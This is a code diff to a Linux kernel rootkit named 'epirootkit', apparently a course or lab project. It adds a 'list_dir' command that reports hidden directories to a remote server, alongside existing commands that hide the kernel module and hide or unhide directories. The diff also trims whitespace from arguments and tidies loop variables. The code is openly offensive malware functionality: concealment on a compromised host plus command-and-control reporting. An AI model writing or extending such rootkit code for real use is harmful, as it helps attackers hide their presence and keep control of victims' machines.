@@ -5,6 +5,7 @@
 #include <linux/module.h>
 #include <linux/net.h>
 #include <linux/socket.h>
+#include <linux/string.h>
 
 #include "epirootkit.h"
 
@@ -30,6 +31,7 @@ int hide_module_handler(char *args);
 int unhide_module_handler(char *args);
 int hide_dir_handler(char *args);
 int show_dir_handler(char *args);
+int list_dir_handler(char *args);
 int help_handler(char *args);
 int rootkit_command(char *command, unsigned command_size);
 
@@ -44,14 +46,16 @@ static struct command rootkit_commands_array[] = {
     { "unhide_module", 13, "unhide the module in the kernel", 36, unhide_module_handler },
     { "hide_dir", 8, "hide a directory from the kernel", 34, hide_dir_handler },
     { "show_dir", 8, "unhide a directory from the kernel", 36, show_dir_handler },
+    { "list_dir", 8, "list hidden directories", 24, list_dir_handler },
     { "help", 4, "display this help message", 30, help_handler },
     { NULL, 0, NULL, 0, NULL }
 };
 
 int help_handler(char *args) {
+    int i;
     char *help_msg = kmalloc(STD_BUFFER_SIZE, GFP_KERNEL);
     int offset = snprintf(help_msg, STD_BUFFER_SIZE, "Available commands:\n");
-    for (int i = 0; rootkit_commands_array[i].cmd_name != NULL; i++) {
+    for (i = 0; rootkit_commands_array[i].cmd_name != NULL; i++) {
         offset += snprintf(help_msg + offset, STD_BUFFER_SIZE - offset, "\t -%s: %s\n",
                            rootkit_commands_array[i].cmd_name, rootkit_commands_array[i].cmd_desc);
         if (offset >= STD_BUFFER_SIZE) {
@@ -76,8 +80,9 @@ int rootkit_command(char *command, unsigned command_size) {
         return -EINVAL;
     }
 
+    int i;
     int ret_code = -EINVAL;
-    for (int i = 0; rootkit_commands_array[i].cmd_name != NULL; i++) {
+    for (i = 0; rootkit_commands_array[i].cmd_name != NULL; i++) {
         if (strncmp(command, rootkit_commands_array[i].cmd_name, rootkit_commands_array[i].cmd_name_size - 1) == 0) {
             char *args = command + rootkit_commands_array[i].cmd_name_size;
             ret_code = rootkit_commands_array[i].cmd_handler(args);
@@ -202,6 +207,7 @@ int unhide_module_handler(char *args) {
 
 int hide_dir_handler(char *args) {
     char *dir = args;
+    dir += strspn(dir, " \t");
     dir[strcspn(dir, "\n")] = '\0';
     int ret_code = add_hidden_dir(dir);
     if (ret_code < 0) {
@@ -215,6 +221,7 @@ int hide_dir_handler(char *args) {
 
 int show_dir_handler(char *args) {
     char *dir = args;
+    dir += strspn(dir, " \t");
     dir[strcspn(dir, "\n")] = '\0';
     int ret_code = remove_hidden_dir(dir);
     if (ret_code < 0) {
@@ -224,4 +231,23 @@ int show_dir_handler(char *args) {
         DBG_MSG("show_dir_handler: directory %s unhidden\n", dir);
     }
     return ret_code;
+}
+
+int list_dir_handler(char *args)
+{
+    char *buf;
+    int len;
+
+    buf = kmalloc(STD_BUFFER_SIZE, GFP_KERNEL);
+    if (!buf)
+        return -ENOMEM;
+
+    len = list_hidden_dirs(buf, STD_BUFFER_SIZE);
+    if (len <= 0)
+        send_to_server("No hidden directories\n");
+    else
+        send_to_server(buf);
+
+    kfree(buf);
+    return 0;
 }
